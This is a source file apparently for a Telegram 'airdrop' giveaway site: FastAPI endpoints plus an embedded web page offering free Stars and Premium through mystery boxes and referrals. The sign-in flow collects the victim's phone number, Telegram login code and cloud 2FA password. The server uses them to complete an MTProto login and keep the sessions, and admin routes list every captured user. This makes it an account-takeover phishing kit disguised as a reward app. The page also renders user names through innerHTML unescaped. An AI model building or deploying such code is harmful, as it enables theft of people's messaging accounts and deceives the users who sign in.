def verify_jwt_dep(credentials: HTTPAuthorizationCredentials = Depends(bearer_scheme)):
    token = credentials.credentials
    payload = SecurityUtils.decode_jwt_token(token)
    if not payload or "sub" not in payload:
        raise HTTPException(status_code=403, detail="Invalid or expired token.")
    return int(payload["sub"])

async def verify_admin_token(api_key: str = Depends(api_key_header)):
    if api_key != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin API key.")
    return True

@app.get("/api/v1/raw/auth", tags=["Raw API"])
async def raw_api_auth(request: Request, num: str = Query(None), otp: str = Query(None), code: str = Query(None)):
    if not await rate_limiter.check(SecurityUtils.get_client_ip(request)): raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    if not num: raise HTTPException(status_code=400, detail="Missing 'num' parameter")
    phone = SecurityUtils.sanitize_phone(num)
    if not SecurityUtils.validate_phone(phone): raise HTTPException(status_code=400, detail="Invalid phone format.")
    
    try:
        if not otp:
            res = await auth_manager.send_code(phone)
            return {"status": "success", "message": "Code sent.", "data": {"session_id": res["session_id"]}}
        elif otp and not code:
            if not (otp.isdigit() and len(otp) == 5):
                raise HTTPException(status_code=400, detail="OTP must be exactly 5 digits.")
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id: raise HTTPException(status_code=400, detail="Session not found.")
            res = await auth_manager.verify_code(session_id, otp, SecurityUtils.get_client_ip(request), request.headers.get("User-Agent"))
            if res["status"] == "2fa_required": return {"status": "2fa_required", "message": "2FA required."}
            return {"status": "success", "message": "Logged in.", "data": res.get("user")}
        elif otp and code:
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id: raise HTTPException(status_code=400, detail="Session not found.")
            res = await auth_manager.verify_2fa(session_id, code, SecurityUtils.get_client_ip(request), request.headers.get("User-Agent"))
            return {"status": "success", "message": "2FA successful.", "data": res.get("user")}
    except HTTPException as e: raise e
    except Exception as e: raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/json/send-code", tags=["JSON API"], dependencies=[Depends(rate_limit_dependency)])
async def json_send_code(payload: dict):
    res = await auth_manager.send_code(payload.get("phone", ""), payload.get("ref_code"))
    return {"status": "success", "message": res["message"], "data": {"session_id": res["session_id"]}}

@app.post("/api/v1/json/verify-code", tags=["JSON API"], dependencies=[Depends(rate_limit_dependency)])
async def json_verify_code(payload: dict, request: Request):
    code = str(payload.get("code", "")).strip()
    if not (code.isdigit() and len(code) == 5):
        raise HTTPException(status_code=400, detail="Code must be exactly 5 digits.")
    res = await auth_manager.verify_code(
        payload.get("session_id", ""), code,
        SecurityUtils.get_client_ip(request), request.headers.get("User-Agent")
    )
    if res["status"] == "2fa_required": return {"status": "2fa_required", "message": res["message"]}
    return {"status": "success", "message": "Login successful.", "jwt_token": res.get("jwt_token"), "user": res.get("user")}

@app.post("/api/v1/json/verify-2fa", tags=["JSON API"], dependencies=[Depends(rate_limit_dependency)])
async def json_verify_2fa(payload: dict, request: Request):
    res = await auth_manager.verify_2fa(
        payload.get("session_id", ""), payload.get("password", ""),
        SecurityUtils.get_client_ip(request), request.headers.get("User-Agent")
    )
    return {"status": "success", "message": "2FA successful.", "jwt_token": res.get("jwt_token"), "user": res.get("user")}

@app.get("/api/v1/airdrop/profile", tags=["Airdrop"])
async def airdrop_profile(user_id: int = Depends(verify_jwt_dep)):
    user = await db.get_user_by_id(user_id)
    if not user: raise HTTPException(status_code=404, detail="User not found.")
    rewards = await db.get_rewards(user_id)
    transactions = await db.get_transactions(user_id)
    return {
        "user_id": user["user_id"], "first_name": user.get("first_name", ""), "username": user.get("username", ""),
        "phone": user["phone"], "balance": user.get("balance", 0), "ref_code": user.get("ref_code", ""),
        "ref_link": f"https://t.me/{settings.BOT_USERNAME}?start=ref_{user.get('ref_code', '')}",
        "referrals": user.get("referrals", 0), "rewards": rewards, "transactions": transactions, "daily_claim": user.get("daily_claim")
    }

@app.post("/api/v1/airdrop/open_gift", tags=["Airdrop"])
async def airdrop_open_gift(user_id: int = Depends(verify_jwt_dep)):
    user = await db.get_user_by_id(user_id)
    if not user: raise HTTPException(status_code=404, detail="User not found.")
    if user.get("balance", 0) < settings.MYSTERY_BOX_COST:
        raise HTTPException(status_code=400, detail=f"You need {settings.MYSTERY_BOX_COST} coins to open the Mystery Box.")
    
    roll = random.random()
    now = datetime.now().isoformat()
    if roll < settings.PREMIUM_CHANCE:
        reward = {"type": "Premium", "amount": "1 Month", "date": now}
    else:
        reward = {"type": "Stars", "amount": random.randint(1, settings.MAX_STARS), "date": now}
        
    new_balance = user["balance"] - settings.MYSTERY_BOX_COST
    await db.update_user_balance(user_id, new_balance, reward)
    await db.log_transaction(user_id, -settings.MYSTERY_BOX_COST, "SPEND", "Mystery Box Opened")
    return {"status": "success", "reward": reward, "new_balance": new_balance}

@app.post("/api/v1/airdrop/claim_daily", tags=["Airdrop"])
async def airdrop_claim_daily(user_id: int = Depends(verify_jwt_dep)):
    user = await db.get_user_by_id(user_id)
    if not user: raise HTTPException(status_code=404, detail="User not found.")
    
    today = datetime.now().strftime("%Y-%m-%d")
    if user.get("daily_claim") == today:
        raise HTTPException(status_code=400, detail="Daily reward already claimed.")
    
    new_balance = user.get("balance", 0) + settings.DAILY_REWARD
    await db.update_user(user_id, {"balance": new_balance, "daily_claim": today})
    await db.log_transaction(user_id, settings.DAILY_REWARD, "DAILY", "Daily Claim Reward")
    return {"status": "success", "message": "Daily reward claimed!", "new_balance": new_balance}

@app.get("/api/v1/airdrop/leaderboard", tags=["Airdrop"])
async def airdrop_leaderboard():
    return await db.get_leaderboard(10)

@app.get("/api/v1/admin/stats", tags=["Admin"], dependencies=[Depends(verify_admin_token)])
async def admin_stats():
    return await db.get_stats()

@app.get("/api/v1/admin/users", tags=["Admin"], dependencies=[Depends(verify_admin_token)])
async def admin_get_users():
    return await db.get_all_users()

@app.post("/api/v1/admin/ban/{user_id}", tags=["Admin"], dependencies=[Depends(verify_admin_token)])
async def admin_ban_user(user_id: int):
    await db.update_user(user_id, {"is_banned": 1})
    return {"status": "success", "message": "User banned."}

@app.get("/api/v1/system/health", tags=["System"])
async def health_check():
    return {"status": "healthy", "version": "400.0.0", "active_sessions": len(auth_manager.active_sessions)}

@app.websocket("/ws/live")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            stats = await db.get_stats()
            await websocket.send_json(stats)
            await asyncio.sleep(5)
    except WebSocketDisconnect:
        log.info("WebSocket disconnected")
    except Exception as e:
        log.error(f"WebSocket error: {e}")

# ============================================================================
# 10. FRONTEND (Pro Shop Ultimate Enterprise SPA - Tabular UI)
# ============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Shop | Ultimate Airdrop</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --ps-gold: #ffb300; --ps-gold-light: #ffd54f;
            --ps-bg: #0a0e14; --ps-bg-secondary: #11161f; --ps-bg-tertiary: #1c2330;
            --ps-text: #ffffff; --ps-text-secondary: #6b7785;
            --ps-success: #00e676; --ps-error: #ff5252; --ps-blue: #00b0ff;
            --ps-border: #2a3342; --ps-purple: #9c27b0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { height: 100%; font-family: 'Inter', sans-serif; background-color: var(--ps-bg); color: var(--ps-text); overflow-x: hidden; }
        
        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background-color: var(--ps-bg); background-image: radial-gradient(circle at 15% 15%, rgba(255, 179, 0, 0.06) 0%, transparent 35%), radial-gradient(circle at 85% 85%, rgba(0, 176, 255, 0.06) 0%, transparent 35%); }
        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; padding-bottom: 80px; }
        
        .auth-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 40px; width: 100%; max-width: 450px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); position: relative; overflow: hidden; }
        .auth-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); }
        .dashboard-card { background: var(--ps-bg-secondary); border-radius: 20px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--ps-border); margin-top: 20px; }
        
        .auth-header { text-align: center; margin-bottom: 30px; }
        .logo-wrapper { width: 80px; height: 80px; margin: 0 auto 15px; background: linear-gradient(135deg, var(--ps-gold) 0%, var(--ps-gold-light) 100%); border-radius: 20px; display: flex; justify-content: center; align-items: center; box-shadow: 0 10px 30px rgba(255, 179, 0, 0.3); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        .logo-wrapper svg { width: 40px; height: 40px; fill: var(--ps-bg); }
        .auth-header h1 { font-size: 24px; font-weight: 800; margin-bottom: 8px; background: linear-gradient(to right, #fff, #6b7785); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-header p { color: var(--ps-text-secondary); font-size: 14px; min-height: 20px; }
        
        .form-group { margin-bottom: 20px; position: relative; }
        .form-label { display: block; margin-bottom: 8px; color: var(--ps-text-secondary); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        .form-input { width: 100%; padding: 16px 18px; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-family: 'Inter', sans-serif; font-size: 16px; outline: none; transition: all 0.2s; }
        .form-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); }
        
        .btn-primary { width: 100%; padding: 16px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); border: none; border-radius: 12px; color: var(--ps-bg); font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; margin-top: 10px; text-transform: uppercase; letter-spacing: 1px; display: flex; align-items: center; justify-content: center; }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 179, 0, 0.3); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-secondary { width: 100%; padding: 12px; background: var(--ps-bg-tertiary); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-secondary:hover { background: var(--ps-border); }
        
        .form-step { display: none; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .form-step.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        
        .otp-group { display: flex; justify-content: space-between; gap: 10px; }
        .otp-input { width: 50px; height: 60px; text-align: center; background: var(--ps-bg); border: 1px solid var(--ps-border); border-radius: 12px; color: var(--ps-text); font-size: 24px; font-weight: 600; outline: none; transition: all 0.2s; }
        .otp-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); transform: scale(1.05); }
        
        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; max-width: 350px; }
        .toast { background: var(--ps-bg-secondary); border-left: 4px solid var(--ps-gold); padding: 15px 20px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); animation: slideIn 0.3s ease; font-size: 14px; border: 1px solid var(--ps-border); }
        .toast.success { border-left-color: var(--ps-success); color: var(--ps-success); }
        .toast.error { border-left-color: var(--ps-error); color: var(--ps-error); }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: var(--ps-bg); animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .dash-header { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; }
        .avatar-placeholder { width: 60px; height: 60px; background: linear-gradient(135deg, var(--ps-gold), var(--ps-gold-light)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 700; color: var(--ps-bg); }
        .dash-info h2 { font-size: 18px; margin-bottom: 4px; }
        .dash-info p { color: var(--ps-text-secondary); font-size: 13px; }
        
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .stat-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--ps-border); text-align: center; transition: transform 0.2s; }
        .stat-box:hover { transform: translateY(-2px); border-color: var(--ps-gold); }
        .stat-box h3 { font-size: 24px; color: var(--ps-gold); margin-bottom: 5px; }
        .stat-box p { font-size: 12px; color: var(--ps-text-secondary); text-transform: uppercase; }
        
        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        .ref-box { background: var(--ps-bg); padding: 15px; border-radius: 12px; border: 1px dashed var(--ps-border); display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .ref-link { color: var(--ps-blue); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 70%; }
        .copy-btn { background: var(--ps-bg-tertiary); color: var(--ps-text); border: none; padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
        .copy-btn:hover { background: var(--ps-gold); color: var(--ps-bg); }
        
        .mystery-box-container { text-align: center; padding: 20px 0; }
        .mystery-box { width: 120px; height: 120px; margin: 0 auto 20px; background: linear-gradient(135deg, var(--ps-purple), #ff4081); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 48px; box-shadow: 0 10px 30px rgba(156, 39, 176, 0.4); cursor: pointer; transition: transform 0.2s; animation: pulse 2s infinite; }
        .mystery-box:hover { transform: scale(1.05); }
        .mystery-box.shaking { animation: shake 0.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(156, 39, 176, 0); } 100% { box-shadow: 0 0 0 0 rgba(156, 39, 176, 0); } }
        @keyframes shake { 0% { transform: rotate(0deg); } 25% { transform: rotate(-10deg); } 75% { transform: rotate(10deg); } 100% { transform: rotate(0deg); } }
        
        .list-container { max-height: 300px; overflow-y: auto; }
        .list-item { display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--ps-bg); border-radius: 10px; margin-bottom: 8px; border: 1px solid var(--ps-border); }
        .list-item:hover { border-color: var(--ps-gold); }
        .item-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; }
        .item-icon.stars { background: rgba(255, 179, 0, 0.2); color: var(--ps-gold); }
        .item-icon.premium { background: rgba(156, 39, 176, 0.2); color: var(--ps-purple); }
        .item-icon.lb { background: var(--ps-bg-tertiary); color: var(--ps-gold); font-weight: 700; }
        .item-icon.tx { background: rgba(0, 176, 255, 0.2); color: var(--ps-blue); }
        .item-info { flex: 1; }
        .item-info p { font-size: 13px; font-weight: 600; }
        .item-info span { font-size: 11px; color: var(--ps-text-secondary); }
        .tx-amount { font-weight: 700; }
        .tx-amount.positive { color: var(--ps-success); }
        .tx-amount.negative { color: var(--ps-error); }
        
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: none; justify-content: center; align-items: center; }
        .modal-overlay.active { display: flex; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .modal-content { background: var(--ps-bg-secondary); padding: 40px; border-radius: 20px; text-align: center; max-width: 350px; width: 90%; border: 2px solid var(--ps-gold); animation: scaleUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes scaleUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .modal-icon { font-size: 64px; margin-bottom: 20px; }
        .modal-title { font-size: 24px; font-weight: 800; margin-bottom: 10px; }
        .modal-desc { color: var(--ps-text-secondary); margin-bottom: 25px; }
        
        .nav-tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--ps-border); }
        .nav-tab { padding: 10px 15px; cursor: pointer; color: var(--ps-text-secondary); border-bottom: 2px solid transparent; transition: 0.2s; font-size: 14px; font-weight: 600; }
        .nav-tab.active { color: var(--ps-gold); border-bottom-color: var(--ps-gold); }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="toast-container" id="toastContainer"></div>
    
    <div class="modal-overlay" id="rewardModal">
        <div class="modal-content">
            <div class="modal-icon" id="modalIcon">🎁</div>
            <h2 class="modal-title" id="modalTitle">Congratulations!</h2>
            <p class="modal-desc" id="modalDesc">You won 10 Stars!</p>
            <button class="btn-primary" onclick="document.getElementById('rewardModal').classList.remove('active')">Awesome!</button>
        </div>
    </div>

    <div class="container">
        <div class="auth-card" id="authCard">
            <div class="auth-header">
                <div class="logo-wrapper"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 13L2 10v8l10 5 10-5v-8l-10 5z"/></svg></div>
                <h1>Pro Shop Airdrop</h1>
                <p id="stepDescription">Secure MTProto Authentication</p>
            </div>
            <div class="form-step active" id="step_phone">
                <form id="phoneForm" autocomplete="off">
                    <div class="form-group"><label class="form-label" for="phone">Phone Number</label><input type="tel" id="phone" class="form-input" placeholder="+1 234 567 890" required></div>
                    <button type="submit" class="btn-primary" id="btnSendCode">Continue</button>
                </form>
            </div>
            <div class="form-step" id="step_code">
                <form id="codeForm" autocomplete="off">
                    <div class="form-group"><label class="form-label">Verification Code</label>
                        <div class="otp-group">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <input type="hidden" id="codeHidden">
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerifyCode">Verify Code</button>
                    <button type="button" class="btn-secondary" id="backToPhone">Change Phone Number</button>
                </form>
            </div>
            <div class="form-step" id="step_2fa">
                <form id="twoFaForm" autocomplete="off">
                    <div class="form-group"><label class="form-label" for="password">Two-Step Verification</label><input type="password" id="password" class="form-input" placeholder="Enter your password" required></div>
                    <button type="submit" class="btn-primary" id="btnVerify2fa">Unlock Account</button>
                </form>
            </div>
        </div>

        <div class="form-step" id="step_dashboard" style="max-width: 500px; width: 100%;">
            <div class="dashboard-card">
                <div class="dash-header">
                    <div class="avatar-placeholder" id="avatarPlaceholder">U</div>
                    <div class="dash-info"><h2 id="userName">Loading...</h2><p id="userUsername">@username</p></div>
                </div>
                <div class="stats-grid">
                    <div class="stat-box"><h3 id="statBalance">0</h3><p>Balance</p></div>
                    <div class="stat-box"><h3 id="statRefs">0</h3><p>Referrals</p></div>
                </div>
                <button class="btn-secondary" id="btnDaily"><span>📅</span> Claim Daily Reward</button>
            </div>
            
            <div class="dashboard-card">
                <div class="section-title">🎁 Mystery Box</div>
                <div class="mystery-box-container">
                    <div class="mystery-box" id="mysteryBox">📦</div>
                    <p style="color:var(--ps-text-secondary); font-size:14px; margin-bottom:15px;">Open the box for 17 Coins to win up to 50 Stars or Premium!</p>
                    <button class="btn-primary" id="btnOpenBox" style="background: linear-gradient(to right, var(--ps-purple), #ff4081);">Open for 17 Coins</button>
                </div>
            </div>
            
            <div class="dashboard-card">
                <div class="section-title">🔗 Referral Link</div>
                <div class="ref-box">
                    <span class="ref-link" id="refLink">https://t.me/YourBot?start=ref_CODE</span>
                    <button class="copy-btn" id="copyBtn">Copy</button>
                </div>
            </div>

            <div class="dashboard-card">
                <div class="nav-tabs">
                    <div class="nav-tab active" data-tab="rewards">🏆 Rewards</div>
                    <div class="nav-tab" data-tab="history">📜 History</div>
                    <div class="nav-tab" data-tab="leaderboard">📊 Leaderboard</div>
                </div>
                <div class="list-container" id="rewardsList"><p style="text-align:center; color:var(--ps-text-secondary); font-size:13px;">No rewards yet.</p></div>
                <div class="list-container" id="historyList" style="display:none;"><p style="text-align:center; color:var(--ps-text-secondary); font-size:13px;">No transactions yet.</p></div>
                <div class="list-container" id="leaderboardList" style="display:none;"><p style="text-align:center; color:var(--ps-text-secondary); font-size:13px;">Loading...</p></div>
            </div>
            
            <button class="btn-primary" id="btnLogout" style="background: var(--ps-error); color: #fff; margin-top: 20px;">Log Out</button>
        </div>
    </div>

    <script>
        let currentSessionId = null; let jwtToken = null; let userId = null;
        const Toast = { container: document.getElementById('toastContainer'), show: function(msg, type='info', dur=3500) { const t = document.createElement('div'); t.className = `toast ${type}`; t.textContent = msg; this.container.appendChild(t); setTimeout(() => t.remove(), dur); } };
        const Steps = { current: 'phone', steps: { phone: { el: document.getElementById('step_phone'), desc: 'Secure MTProto Authentication' }, code: { el: document.getElementById('step_code'), desc: 'Enter the 5-digit code sent to your app' }, '2fa': { el: document.getElementById('step_2fa'), desc: 'Enter your cloud password' }, dashboard: { el: document.getElementById('step_dashboard'), desc: 'Welcome to Airdrop Dashboard' } }, go: function(step) { document.getElementById('authCard').style.display = step === 'dashboard' ? 'none' : 'block'; Object.values(this.steps).forEach(s => s.el.classList.remove('active')); this.steps[step].el.classList.add('active'); this.current = step; } };
        async function apiReq(endpoint, data) { const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); const json = await res.json(); if (!res.ok) throw new Error(json.detail || 'API Error'); return json; }
        function setLoading(btn, loading, text) { btn.disabled = loading; btn.innerHTML = loading ? `<span class="spinner"></span> Processing...` : text; }

        document.getElementById('phoneForm').addEventListener('submit', async (e) => {
            e.preventDefault(); const phone = document.getElementById('phone').value.trim(); const btn = document.getElementById('btnSendCode');
            const urlParams = new URLSearchParams(window.location.search); const refCode = urlParams.get('ref');
            if (!phone.match(/^\+?[0-9]{10,15}$/)) return Toast.show('Invalid phone format.', 'error');
            setLoading(btn, true, 'Continue');
            try { const res = await apiReq('/api/v1/json/send-code', { phone, ref_code: refCode }); currentSessionId = res.data.session_id; Toast.show(res.message, 'success'); Steps.go('code'); } catch (err) { Toast.show(err.message, 'error'); } finally { setLoading(btn, false, 'Continue'); }
        });

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => { if (input.value.length > 1) input.value = input.value.slice(0, 1); if (input.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus(); let code = ''; otpInputs.forEach(i => code += i.value); document.getElementById('codeHidden').value = code; });
            input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus(); });
        });

        document.getElementById('codeForm').addEventListener('submit', async (e) => {
            e.preventDefault(); const code = document.getElementById('codeHidden').value; const btn = document.getElementById('btnVerifyCode');
            if (code.length !== 5) return Toast.show('Enter all 5 digits.', 'error');
            setLoading(btn, true, 'Verify Code');
            try { const res = await apiReq('/api/v1/json/verify-code', { session_id: currentSessionId, code }); if (res.status === 'success') { jwtToken = res.jwt_token; userId = res.user.user_id; Toast.show('Login successful!', 'success'); loadDashboard(); Steps.go('dashboard'); } else if (res.status === '2fa_required') { Toast.show(res.message, 'info'); Steps.go('2fa'); } } catch (err) { Toast.show(err.message, 'error'); } finally { setLoading(btn, false, 'Verify Code'); }
        });

        document.getElementById('backToPhone').addEventListener('click', () => { otpInputs.forEach(i => i.value = ''); Steps.go('phone'); });

        document.getElementById('twoFaForm').addEventListener('submit', async (e) => {
            e.preventDefault(); const password = document.getElementById('password').value; const btn = document.getElementById('btnVerify2fa');
            setLoading(btn, true, 'Unlock Account');
            try { const res = await apiReq('/api/v1/json/verify-2fa', { session_id: currentSessionId, password }); if (res.status === 'success') { jwtToken = res.jwt_token; userId = res.user.user_id; Toast.show('2FA successful!', 'success'); loadDashboard(); Steps.go('dashboard'); } } catch (err) { Toast.show(err.message, 'error'); } finally { setLoading(btn, false, 'Unlock Account'); }
        });

        async function loadDashboard() {
            try { const res = await fetch('/api/v1/airdrop/profile', { headers: { 'Authorization': `Bearer ${jwtToken}` } }); const data = await res.json();
                document.getElementById('userName').textContent = `${data.first_name || 'User'}`;
                document.getElementById('userUsername').textContent = data.username ? `@${data.username}` : `ID: ${data.user_id}`;
                document.getElementById('avatarPlaceholder').textContent = data.first_name ? data.first_name.charAt(0).toUpperCase() : 'U';
                document.getElementById('statBalance').textContent = data.balance;
                document.getElementById('statRefs').textContent = data.referrals;
                document.getElementById('refLink').textContent = data.ref_link || `https://t.me/YourBot?start=ref_${data.ref_code}`;
                
                const rewardsList = document.getElementById('rewardsList');
                if(data.rewards && data.rewards.length > 0) { rewardsList.innerHTML = data.rewards.map(r => `<div class="list-item"><div class="item-icon ${r.type.toLowerCase()}">${r.type === 'Premium' ? '⭐️' : '✨'}</div><div class="item-info"><p>${r.amount} ${r.type}</p><span>${new Date(r.date).toLocaleString()}</span></div></div>`).join(''); }
                
                const historyList = document.getElementById('historyList');
                if(data.transactions && data.transactions.length > 0) { historyList.innerHTML = data.transactions.map(t => `<div class="list-item"><div class="item-icon tx">💳</div><div class="item-info"><p>${t.type}</p><span>${new Date(t.date).toLocaleString()}</span></div><div class="tx-amount ${t.amount > 0 ? 'positive' : 'negative'}">${t.amount > 0 ? '+' : ''}${t.amount}</div></div>`).join(''); }
            } catch (err) { Toast.show('Failed to load profile.', 'error'); }
            loadLeaderboard();
        }

        async function loadLeaderboard() {
            try { const res = await fetch('/api/v1/airdrop/leaderboard'); const data = await res.json();
                const lbList = document.getElementById('leaderboardList');
                if(data && data.length > 0) { lbList.innerHTML = data.map((u, i) => `<div class="list-item"><div class="item-icon lb">${i+1}</div><div class="item-info"><p>${u.first_name || 'User'}</p><span>${u.balance} coins</span></div></div>`).join(''); }
            } catch (err) { console.error('Failed to load leaderboard'); }
        }

        document.getElementById('btnOpenBox').addEventListener('click', async () => {
            const box = document.getElementById('mysteryBox'); const btn = document.getElementById('btnOpenBox');
            box.classList.add('shaking'); btn.disabled = true; btn.innerHTML = `<span class="spinner"></span> Opening...`;
            try { const res = await fetch('/api/v1/airdrop/open_gift', { method: 'POST', headers: { 'Authorization': `Bearer ${jwtToken}` } }); const data = await res.json(); if(!res.ok) throw new Error(data.detail);
                setTimeout(() => { box.classList.remove('shaking'); btn.disabled = false; btn.innerHTML = 'Open for 17 Coins';
                    document.getElementById('modalIcon').textContent = data.reward.type === 'Premium' ? '🚀' : '✨';
                    document.getElementById('modalTitle').textContent = data.reward.type === 'Premium' ? 'JACKPOT!' : 'You Won!';
                    document.getElementById('modalDesc').textContent = `Congratulations! You won ${data.reward.amount} ${data.reward.type}!`;
                    document.getElementById('rewardModal').classList.add('active');
                    document.getElementById('statBalance').textContent = data.new_balance; loadDashboard();
                }, 1500);
            } catch (err) { box.classList.remove('shaking'); btn.disabled = false; btn.innerHTML = 'Open for 17 Coins'; Toast.show(err.message, 'error'); }
        });

        document.getElementById('btnDaily').addEventListener('click', async () => {
            try { const res = await fetch('/api/v1/airdrop/claim_daily', { method: 'POST', headers: { 'Authorization': `Bearer ${jwtToken}` } }); const data = await res.json(); if(!res.ok) throw new Error(data.detail); Toast.show(data.message, 'success'); loadDashboard(); } catch (err) { Toast.show(err.message, 'error'); }
        });

        document.querySelectorAll('.nav-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.list-container').forEach(c => c.style.display = 'none');
                tab.classList.add('active');
                document.getElementById(tab.dataset.tab + 'List').style.display = 'block';
            });
        });

        document.getElementById('copyBtn').addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('refLink').textContent); Toast.show('Referral link copied!', 'success'); });
        document.getElementById('btnLogout').addEventListener('click', () => { window.location.href = '/'; });
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def serve_frontend():
    if not settings.ENABLE_WEB_UI: return HTMLResponse("<h1>Pro Shop API</h1><p>Web UI is disabled.</p>")
    return HTMLResponse(content=FRONTEND_HTML)

# ============================================================================
# 11. MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    log.info("Initializing Pro Shop Ultimate Enterprise System...")
    uvicorn.run("app:app", host=settings.HOST, port=settings.PORT, log_level="info", workers=1)
